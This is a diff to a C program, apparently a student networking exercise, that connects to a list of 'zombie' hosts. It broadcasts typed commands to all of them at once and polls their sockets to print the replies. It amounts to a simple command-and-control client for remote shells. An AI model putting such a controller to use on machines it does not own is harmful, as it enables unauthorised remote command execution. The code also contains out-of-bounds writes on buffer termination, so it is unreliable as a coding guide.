@@ -1,11 +1,12 @@
+#include <poll.h>
+#include <netdb.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
 #include <sys/types.h>
-#include <sys/socket.h>
 #include <arpa/inet.h>
-#include <netdb.h>
+#include <sys/socket.h>
 
 
 #include "utils_v2.h"
@@ -39,13 +40,16 @@ void menu() {
  * RES  : nothing.
  */
 void sendCommands(int * zombies, int zombieCount){
-	char * command = malloc(BUFF_SZ * sizeof(char));
+	char command[BUFF_SZ] = {0};
+	int bytesRead = 0;
 	write(1, "\n> ", 3 * sizeof(char));
-	read(0, command, BUFF_SZ);
-	for(int i = 0;i < zombieCount;i++){
-		write(zombies[i], command, strlen(command));
-	}
-	free(command);
+	do{
+		bytesRead = read(0, command, BUFF_SZ);
+		command[bytesRead] = '\0';
+		for(int i = 0;i < zombieCount;i++){
+			write(zombies[i], command, strlen(command));
+		}
+	} while(bytesRead > 0);
 }
 
 /**
@@ -55,7 +59,37 @@ void sendCommands(int * zombies, int zombieCount){
  * RES  : nothing.
  */
 void receiveAnswers(int * zombies, int zombieCount){
+	struct pollfd * zombie_fds = (struct pollfd *) malloc(zombieCount * sizeof(struct pollfd));
+	for(int i = 0;i < zombieCount;i++){
+		zombie_fds[i].fd = zombies[i];
+		zombie_fds[i].events = POLLIN;
+	}
 
+	char buffer[BUFF_SZ] = {0};
+
+	while(1){
+		int poll_res = poll(zombie_fds, zombieCount, 0);
+		if(poll_res < 0){
+			printf("Erreur de pollfd!\n");
+			exit(1);
+		} 
+		if(poll_res > 0){
+			for(int i = 0;i < zombieCount;i++){
+				if(zombie_fds[i].revents & POLLIN){
+					int bytesRead = 0;
+					printf("\n----------\n\tlistening to file descriptor : %d \n\n", zombie_fds[i].fd);
+					do{
+						bytesRead = read(zombie_fds[i].fd, buffer, BUFF_SZ);
+						buffer[bytesRead] = '\0';
+						write(1, buffer, strlen(buffer));
+					}while(bytesRead > 0);
+					write(1, "\n> ", 3 * sizeof(char));
+				}
+			}
+		}
+	}
+
+	free(zombie_fds);
 }
 
 
@@ -91,6 +125,8 @@ int main(int argc, char **argv) {
 	}
 	
 	char ** ips = (char **) malloc((argc - 1) * sizeof(char *));
+	int * zombies = NULL;
+	int zombieCount = 0;
 
 	for(int i = 1;i < argc;i++){
 		ips[i - 1] = (char *) malloc(strlen(argv[i]) * sizeof(char));
@@ -119,6 +155,16 @@ int main(int argc, char **argv) {
 				continue; 
 			}
 
+			if(zombies == NULL){
+				zombies = (int *) malloc(sizeof(int));
+				zombies[0] = sock;
+				zombieCount = 1;
+			}else{
+				zombieCount++;
+				zombies = (int *) realloc(zombies, zombieCount * sizeof(int));
+				zombies[zombieCount - 1] = sock;
+			}
+
 			printf("Connexion établie avec %s:%d\n", ips[i], port);
 
 			break;
@@ -129,44 +175,17 @@ int main(int argc, char **argv) {
 		}
 	}
 
-	// printf("port du zombie = %d ",connectedPort);
 
-
-	/*
-
-	Il faut 2 processus un de lecture et un d'ecriture, separer le write et read en 
-	2 processus.
-
-	Utilisation des poll (asynchrone).
-
-	*/
-	char buffer[BUF_SIZE];
-	while (1) {
-		printf("Entrez votre commande a envoyer aux zombies: ");
-		fgets(buffer, BUF_SIZE, stdin);
-
-		if (strcmp(buffer, "exit\n") == 0) {
-			break;
-		}
-
-		ssize_t message_envoye = write(sock, buffer, strlen(buffer));
-		if (message_envoye < 0) {
- 			printf("error message_envoye");
-			break;
-		}
-
-		ssize_t message_recu = read(sock, buffer, BUF_SIZE);
-		if (message_recu < 0) {
-			printf("error message_recu");
-			break;
-		}
-
-		buffer[message_recu] = '\0';
-
-		printf("Reponse de la commande executé =   \n %s",buffer);
+	pid_t pid = fork();
+	if(pid){
+		sendCommands(zombies, zombieCount);
+	}else{
+		receiveAnswers(zombies, zombieCount);
 	}
 
-	close(sock);
+
+	
+	free(zombies);
 
 	for(int i = 0;i < argc - 1;i++){
 		free(ips[i]);
